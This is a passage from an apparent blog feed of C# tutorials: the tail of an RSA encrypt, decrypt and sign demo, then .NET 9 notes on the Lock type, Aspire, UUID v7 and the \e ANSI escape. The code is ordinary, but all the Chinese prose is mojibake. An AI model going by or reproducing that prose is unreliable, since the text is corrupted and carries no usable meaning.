trueï¼›å¦åˆ™ï¼Œå°†è¾“å‡º Signature is valid: false æˆ–é”™è¯¯æ¶ˆæ¯ã€‚<br>ç¡®ä¿å…¬é’¥å’Œç­¾åçš„å®Œæ•´æ€§ï¼Œä»¥åŠä½¿ç”¨ä¸ç­¾åæ—¶ç›¸åŒçš„å“ˆå¸Œç®—æ³•å’Œå¡«å……æ–¹æ¡ˆï¼Œè¿™æ ·æ‰èƒ½æ­£ç¡®éªŒè¯ç­¾åçš„æœ‰æ•ˆæ€§ã€‚</p><p>å…¬é’¥åŠ å¯† ç§é’¥è§£å¯†<br>ç§é’¥ç­¾å å…¬é’¥éªŒè¯ </p><h1 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> originalText = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="comment">// åˆ›å»º RSA ç®—æ³•å®ä¾‹</span></span><br><span class="line"><span class="keyword">using</span> (RSA rsa = RSA.Create())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å¯¼å‡ºå…¬é’¥</span></span><br><span class="line">    <span class="built_in">string</span> publicKey = Convert.ToBase64String(rsa.ExportRSAPublicKey());</span><br><span class="line">    <span class="comment">// å¯¼å‡ºç§é’¥</span></span><br><span class="line">    <span class="built_in">string</span> privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey());</span><br><span class="line"></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;publicKey \n&quot;</span> + publicKey + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;priKey &quot;</span> + privateKey + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> key1 = <span class="string">&quot;MxBase64&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">string</span> sclientstr = <span class="string">&quot;aIQ==&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> key2 = <span class="string">&quot;MIB64Cv+&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŠ å¯†</span></span><br><span class="line">    <span class="built_in">byte</span>[] encryptedBytes = RSAHelper.RSAEncrypt(originalText, publicKey);</span><br><span class="line">    <span class="built_in">string</span> encryptedText = Convert.ToBase64String(encryptedBytes);</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Encrypted Text: <span class="subst">&#123;encryptedText&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£å¯†</span></span><br><span class="line">    <span class="built_in">string</span> decryptedText = RSAHelper.RSADecrypt(encryptedBytes, privateKey);</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Decrypted Text: <span class="subst">&#123;decryptedText&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£å¯†2</span></span><br><span class="line">    <span class="built_in">string</span> decryptedText2 = RSAHelper.RSADecryptS(sclientstr, key2);</span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;Decrypted Text2: <span class="subst">&#123;decryptedText2&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="comment">//  //key</span></span><br><span class="line">    <span class="built_in">string</span> keyim = ConfigManager.Temp1;</span><br><span class="line">    <span class="comment">//aes åŠ å¯†</span></span><br><span class="line">    <span class="built_in">string</span> encrypted = Aesv1.Encrypt(<span class="string">&quot;1234567890A2&quot;</span>, keyim);<span class="comment">// decryptedText2);//keyim</span></span><br><span class="line">    Console.WriteLine(<span class="string">$&quot;encrypted <span class="subst">&#123;encrypted&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//byte[] encrypted2  = RSAHelper.RSAEncrypt(&quot;1234567890A2&quot;, decryptedText2); </span></span><br><span class="line">    <span class="comment">//string encryptedText2 = Convert.ToBase64String(encrypted2);//</span></span><br><span class="line">    <span class="comment">//Console.WriteLine($&quot;encrypted2 &#123;encryptedText2&#125;&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç­¾å </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> signStr = RSAHelper.RSASignDataS(encrypted, key2);</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;encrypted 1111111111111 &quot;</span>+ signStr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;c# RAS&lt;/p&gt;
&lt;p&gt;C#éå¯¹ç§°åŠ å¯†  ä¾‹å­&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="c#" scheme="https://banjinmei.github.io/tags/c/"/>
    
    <category term="ras" scheme="https://banjinmei.github.io/tags/ras/"/>
    
  </entry>
  
  <entry>
    <title>.NET9 lock Aspire UUID JsonSerializerOptions</title>
    <link href="https://banjinmei.github.io/2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/"/>
    <id>https://banjinmei.github.io/2025/01/02/NET9-lock-Aspire-UUID-JsonSerializerOptions/</id>
    <published>2025-01-01T16:05:49.000Z</published>
    <updated>2025-01-01T16:12:10.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NET9"><a href="#NET9" class="headerlink" title=".NET9"></a>.NET9</h1><p>è¿„ä»Šä¸ºæ­¢æœ€é«˜æ•ˆã€æœ€ç°ä»£ã€æœ€å®‰å…¨ã€æœ€æ™ºèƒ½ã€æ€§èƒ½æœ€é«˜çš„.NETç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet --list-sdks</span><br><span class="line"><span class="comment"># æŒ‡ä»¤æŸ¥çœ‹æ˜¯å¦ä»¥å®‰è£….NET9ã€‚</span></span><br></pre></td></tr></table></figure><p> ä¸‹è½½.NET9 SDKå®‰è£… or<br> IDE Visual Studio æ›´æ–°</p><h1 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h1><p>å¼•å…¥ System.Threading.Lock æ˜¯ .NET æä¾›çš„ä¸€ä¸ªæ›´ä¼˜é›…çš„é”å®šæœºåˆ¶ï¼Œå¯ä»¥æ›¿ä»£ä¼ ç»Ÿçš„åŸºäº Monitor çš„é”å®šæ–¹å¼ã€‚ä»¥ä¸‹æ˜¯æ–°é”å®šæœºåˆ¶çš„ç‰¹ç‚¹åŠç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Lock _lock = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ–°é”å®šæœºåˆ¶</span></span><br><span class="line">        <span class="keyword">using</span> (_lock.EnterScope())</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;è¿™æ˜¯çº¿ç¨‹å®‰å…¨çš„ä»£ç å—&quot;</span>);</span><br><span class="line">            <span class="comment">// åœ¨è¿™é‡Œæ‰§è¡Œçº¿ç¨‹å®‰å…¨çš„æ“ä½œ</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¼”ç¤ºå¤šçº¿ç¨‹åœºæ™¯</span></span><br><span class="line">        Thread thread1 = <span class="keyword">new</span>(() =&gt; AccessResource(<span class="string">&quot;çº¿ç¨‹1&quot;</span>));</span><br><span class="line">        Thread thread2 = <span class="keyword">new</span>(() =&gt; AccessResource(<span class="string">&quot;çº¿ç¨‹2&quot;</span>));</span><br><span class="line"></span><br><span class="line">        thread1.Start();</span><br><span class="line">        thread2.Start();</span><br><span class="line"></span><br><span class="line">        thread1.Join();</span><br><span class="line">        thread2.Join();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AccessResource</span>(<span class="params"><span class="built_in">string</span> threadName</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (_lock.EnterScope())</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;threadName&#125;</span> æ­£åœ¨è®¿é—®å…±äº«èµ„æº...&quot;</span>);</span><br><span class="line">            Thread.Sleep(<span class="number">1000</span>); <span class="comment">// æ¨¡æ‹Ÿä¸€äº›æ“ä½œ</span></span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;<span class="subst">&#123;threadName&#125;</span> å®Œæˆè®¿é—®&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰é”å¯¹è±¡ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Lock _lock = <span class="keyword">new</span>();</span><br></pre></td></tr></table></figure><p>Lock ç±»å‹ä¸“é—¨ç”¨äºå®ç°é”å®šï¼Œæ¯” object æ›´æ¸…æ™°å’Œå®‰å…¨ã€‚<br>è¿›å…¥é”å®šèŒƒå›´ï¼š<br>using (_lock.EnterScope())<br>EnterScope è¿”å›ä¸€ä¸ª ref structï¼Œå®ƒåœ¨ç¦»å¼€ä½œç”¨åŸŸæ—¶è‡ªåŠ¨é‡Šæ”¾é”ã€‚<br>å¤šçº¿ç¨‹åœºæ™¯ï¼š<br>å¤šä¸ªçº¿ç¨‹å°è¯•è®¿é—®å…±äº«èµ„æºï¼Œé€šè¿‡ using ç¡®ä¿ä»£ç å—æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚<br>ä¼˜åŠ¿<br>é¿å…ä¼ ç»Ÿ Monitor.Enter å’Œ Monitor.Exit çš„ç¹çä»£ç åŠæ½œåœ¨çš„é”™è¯¯ã€‚<br>è‡ªåŠ¨é‡Šæ”¾é”ï¼Œå‡å°‘èµ„æºæ³„æ¼çš„é£é™©ã€‚<br>ç±»å‹å®‰å…¨çš„è®¾è®¡é¿å…äº†åœ¨å¼‚æ­¥åœºæ™¯ä¸­çš„è¯¯ç”¨ã€‚<br>æ³¨æ„äº‹é¡¹<br>Lock.EnterScope è¿”å› ref structï¼Œå› æ­¤å®ƒä¸èƒ½è¢«æ•è·æˆ–åœ¨å¼‚æ­¥æ–¹æ³•ä¸­ä½¿ç”¨ã€‚<br>Lock æ˜¯ä¸å¯å¤åˆ¶çš„ï¼Œç¡®ä¿é”çš„ç‹¬å æ€§å’Œå®‰å…¨æ€§ã€‚<br>è¿™æ˜¯ä¸€ä¸ªæ›´ç°ä»£åŒ–çš„çº¿ç¨‹åŒæ­¥æ–¹å¼ï¼Œéå¸¸é€‚åˆåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</p><p>æ›´å®‰å…¨ã€æ›´é«˜æ•ˆã€‚ å¯ä»¥å’Œusingä¸€èµ·ä½¿ç”¨</p><!-- https://www.cnblogs.com/hugogoos/p/18563166 --><h1 id="NET-Aspire-Blazor-Web-Web-API"><a href="#NET-Aspire-Blazor-Web-Web-API" class="headerlink" title=".NET Aspire  - Blazor Web Web API"></a>.NET Aspire  - Blazor Web Web API</h1><p>å¯ä»¥é€‰æ‹©ä½¿ç”¨ Redis è¿›è¡Œç¼“å­˜ æµ‹è¯•é¡¹ç›®</p><p><a class="link"   href="https://learn.microsoft.com/zh-cn/dotnet/aspire/" >https://learn.microsoft.com/zh-cn/dotnet/aspire/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/communitytoolkit/aspire" >https://github.com/communitytoolkit/aspire<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://learn.microsoft.com/zh-cn/dotnet/aspire/whats-new/dotnet-aspire-9?tabs=windows" >https://learn.microsoft.com/zh-cn/dotnet/aspire/whats-new/dotnet-aspire-9?tabs=windows<i class="fas fa-external-link-alt"></i></a></p><p>å¯¹æ¯”.NET8 ,.NET9  å¤šäº† vue recat angular  webé¡¹ç›® </p><h1 id="UUID-v7"><a href="#UUID-v7" class="headerlink" title="UUID v7"></a>UUID v7</h1><p>æˆ‘ä»¬ç»å¸¸åœ¨å®ä½“ä¸­ä½¿ç”¨Guidä½œä¸ºä¸»é”®ï¼Œå¹¶ä¸”é€šè¿‡Guid.NewGuid()å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”Ÿæˆä¸€ä¸ªæ–°çš„Guidï¼Œè€Œæ­¤æ–¹æ³•ç”Ÿæˆçš„Guidæ˜¯ä¾æ®UUIDç¬¬å››ä¸ªç‰ˆæœ¬è§„èŒƒç”Ÿæˆçš„ã€‚</p><p>å½“å‰å·²ç»å¯ä»¥é€šè¿‡Guid.CreateVersion7()æ–¹æ³•åˆ›å»ºUUIDç¬¬ä¸ƒä¸ªç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬UUIDä¸»è¦åŠŸèƒ½å°±æ˜¯åŒ…å«äº†æ—¶é—´æˆ³ï¼Œæ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><p><strong>| 48ä½æ—¶é—´æˆ³ | 12ä½éšæœº | 62ä½éšæœº |</strong></p><p>è¿™ä¹Ÿæ„å‘³ç€v7ç‰ˆæœ¬çš„UUIDå¯ä»¥æŒ‰æ—¶é—´æ’åºäº†ï¼Œåœ¨æ•°æ®åº“ä¸­ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼ŒåŒæ—¶Guid.CreateVersion7()æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªé‡è½½æ–¹æ³•æ¥æ”¶DateTimeOffsetç±»å‹æ—¶é—´æˆ³ï¼Œç”¨æ¥é€šè¿‡æŒ‡å®šæ—¶é—´åˆ›å»ºUUIDã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v4 UUID</span></span><br><span class="line"><span class="keyword">var</span> guid_v4 = Guid.NewGuid();</span><br><span class="line"><span class="comment">// v7 UUID</span></span><br><span class="line"><span class="keyword">var</span> guid_v7 = Guid.CreateVersion7();</span><br><span class="line"><span class="comment">// v7 UUID with timestamp</span></span><br><span class="line"><span class="keyword">var</span> guid_v7_time = Guid.CreateVersion7(TimeProvider.System.GetLocalNow());</span><br><span class="line"></span><br><span class="line">Console.WriteLine(guid_v4);</span><br><span class="line">Console.WriteLine(guid_v7);</span><br><span class="line">Console.WriteLine(guid_v7_time);</span><br></pre></td></tr></table></figure><h1 id="e"><a href="#e" class="headerlink" title="\e"></a>\e</h1><p>åœ¨ C# ä¸­ï¼Œéšç€æ–°çš„è½¬ä¹‰åºåˆ— \e çš„å¼•å…¥ï¼Œå¼€å‘è€…å¯ä»¥æ›´æ–¹ä¾¿åœ°è¡¨ç¤º Unicode å­—ç¬¦ U+001B (ESCAPE å­—ç¬¦)ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ä»£ç ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨æ–°çš„è½¬ä¹‰åºåˆ— \e å’Œä¼ ç»Ÿæ–¹å¼çš„åŒºåˆ«ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ–°çš„è½¬ä¹‰åºåˆ— \e</span></span><br><span class="line">        <span class="built_in">string</span> newEscapeSequence = <span class="string">&quot;\e[31mHello, World!\e[0m&quot;</span>; <span class="comment">// ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Using \\e:&quot;</span>);</span><br><span class="line">        Console.WriteLine(newEscapeSequence);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ—§çš„æ–¹å¼ \u001b</span></span><br><span class="line">        <span class="built_in">string</span> oldUnicodeEscape = <span class="string">&quot;\u001b[31mHello, World!\u001b[0m&quot;</span>; <span class="comment">// ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Using \\u001b:&quot;</span>);</span><br><span class="line">        Console.WriteLine(oldUnicodeEscape);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ—§çš„æ–¹å¼ \x1b</span></span><br><span class="line">        <span class="built_in">string</span> oldHexEscape = <span class="string">&quot;\x1b[31mHello, World!\x1b[0m&quot;</span>; <span class="comment">// ANSI è½¬ä¹‰ä»£ç ï¼šçº¢è‰²æ–‡æœ¬</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Using \\x1b:&quot;</span>);</span><br><span class="line">        Console.WriteLine(oldHexEscape);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼š\x1b åå¯èƒ½æ„å¤–åŒ…å«åç»­çš„æœ‰æ•ˆåå…­è¿›åˆ¶å­—ç¬¦</span></span><br><span class="line">        <span class="built_in">string</span> potentialIssue = <span class="string">&quot;\x1b7Hello&quot;</span>; <span class="comment">// å¯èƒ½è¢«è§£æä¸º \x1b7 è€Œä¸æ˜¯å•ç‹¬çš„ \x1b</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Potential issue with \\x1b:&quot;</span>);</span><br><span class="line">        Console.WriteLine(potentialIssue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨èä½¿ç”¨ \eï¼šå®ƒæ›´ç®€æ´å¹¶ä¸”æ²¡æœ‰å¯èƒ½çš„æ­§ä¹‰ã€‚<br>é¿å…ä½¿ç”¨ \x1bï¼šå¦‚æœåç»­å­—ç¬¦æ˜¯åå…­è¿›åˆ¶æ•°å­—ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–ç»“æœã€‚ä¾‹å¦‚ï¼Œ\x1b7 ä¼šè¢«è§£æä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œè€Œä¸æ˜¯ ESC å­—ç¬¦åè·Ÿ 7ã€‚<br>å‘åå…¼å®¹ï¼šC# ä»ç„¶æ”¯æŒ \u001b å’Œ \x1bï¼Œä½†å»ºè®®é€æ­¥è¿ç§»åˆ° \eã€‚<br>æ–°çš„è½¬ä¹‰åºåˆ— \e æé«˜äº†ä»£ç å¯è¯»æ€§å’Œå®‰å…¨æ€§ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç† ANSI è½¬ä¹‰åºåˆ—æ—¶ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº›æ›´ä¸°å¯Œçš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•ä½¿ç”¨æ–°çš„ \e è½¬ä¹‰åºåˆ—ï¼Œä»¥åŠå¦‚ä½•åœ¨å„ç§åœºæ™¯ä¸­æ›¿ä»£æ—§çš„æ–¹å¼ã€‚</p><h2 id="ç¤ºä¾‹-1-æ§åˆ¶å°ä¸­çš„é¢œè‰²åˆ‡æ¢"><a href="#ç¤ºä¾‹-1-æ§åˆ¶å°ä¸­çš„é¢œè‰²åˆ‡æ¢" class="headerlink" title="ç¤ºä¾‹ 1: æ§åˆ¶å°ä¸­çš„é¢œè‰²åˆ‡æ¢"></a>ç¤ºä¾‹ 1: æ§åˆ¶å°ä¸­çš„é¢œè‰²åˆ‡æ¢</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ \e è½¬ä¹‰åºåˆ—æ¥æ”¹å˜æ–‡å­—é¢œè‰²</span></span><br><span class="line">        <span class="built_in">string</span> redText = <span class="string">&quot;\e[31mThis is red text\e[0m&quot;</span>;  <span class="comment">// çº¢è‰²æ–‡æœ¬</span></span><br><span class="line">        <span class="built_in">string</span> greenText = <span class="string">&quot;\e[32mThis is green text\e[0m&quot;</span>;  <span class="comment">// ç»¿è‰²æ–‡æœ¬</span></span><br><span class="line">        <span class="built_in">string</span> yellowText = <span class="string">&quot;\e[33mThis is yellow text\e[0m&quot;</span>;  <span class="comment">// é»„è‰²æ–‡æœ¬</span></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(redText);</span><br><span class="line">        Console.WriteLine(greenText);</span><br><span class="line">        Console.WriteLine(yellowText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹-2-å¸¦æœ‰å…‰æ ‡ç§»åŠ¨çš„æ§åˆ¶å°è¾“å‡º"><a href="#ç¤ºä¾‹-2-å¸¦æœ‰å…‰æ ‡ç§»åŠ¨çš„æ§åˆ¶å°è¾“å‡º" class="headerlink" title="ç¤ºä¾‹ 2: å¸¦æœ‰å…‰æ ‡ç§»åŠ¨çš„æ§åˆ¶å°è¾“å‡º"></a>ç¤ºä¾‹ 2: å¸¦æœ‰å…‰æ ‡ç§»åŠ¨çš„æ§åˆ¶å°è¾“å‡º</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ \e æ¥æ§åˆ¶å…‰æ ‡ä½ç½®</span></span><br><span class="line">        <span class="built_in">string</span> moveCursorUp = <span class="string">&quot;\e[1A&quot;</span>; <span class="comment">// å…‰æ ‡ä¸Šç§» 1 è¡Œ</span></span><br><span class="line">        <span class="built_in">string</span> moveCursorDown = <span class="string">&quot;\e[1B&quot;</span>; <span class="comment">// å…‰æ ‡ä¸‹ç§» 1 è¡Œ</span></span><br><span class="line">        <span class="built_in">string</span> moveCursorRight = <span class="string">&quot;\e[10C&quot;</span>; <span class="comment">// å…‰æ ‡å³ç§» 10 åˆ—</span></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Line 1&quot;</span>);</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Line 2&quot;</span>);</span><br><span class="line">        Console.WriteLine(moveCursorUp + <span class="string">&quot;Moved Up&quot;</span>);</span><br><span class="line">        Console.WriteLine(moveCursorRight + <span class="string">&quot;Moved Right&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹-3-æ ¼å¼åŒ–å¤šç§æ ·å¼"><a href="#ç¤ºä¾‹-3-æ ¼å¼åŒ–å¤šç§æ ·å¼" class="headerlink" title="ç¤ºä¾‹ 3: æ ¼å¼åŒ–å¤šç§æ ·å¼"></a>ç¤ºä¾‹ 3: æ ¼å¼åŒ–å¤šç§æ ·å¼</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ ANSI è½¬ä¹‰åºåˆ—æ¥æ··åˆæ ·å¼</span></span><br><span class="line">        <span class="built_in">string</span> boldAndRed = <span class="string">&quot;\e[1;31mBold and Red Text\e[0m&quot;</span>; <span class="comment">// ç²—ä½“ + çº¢è‰²</span></span><br><span class="line">        <span class="built_in">string</span> underlineAndGreen = <span class="string">&quot;\e[4;32mUnderline and Green Text\e[0m&quot;</span>; <span class="comment">// ä¸‹åˆ’çº¿ + ç»¿è‰²</span></span><br><span class="line">        <span class="built_in">string</span> inverted = <span class="string">&quot;\e[7mInverted Colors\e[0m&quot;</span>; <span class="comment">// åè½¬é¢œè‰²</span></span><br><span class="line"></span><br><span class="line">        Console.WriteLine(boldAndRed);</span><br><span class="line">        Console.WriteLine(underlineAndGreen);</span><br><span class="line">        Console.WriteLine(inverted);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç¤ºä¾‹-4-æ¸…å±å’Œéšè—å…‰æ ‡"><a 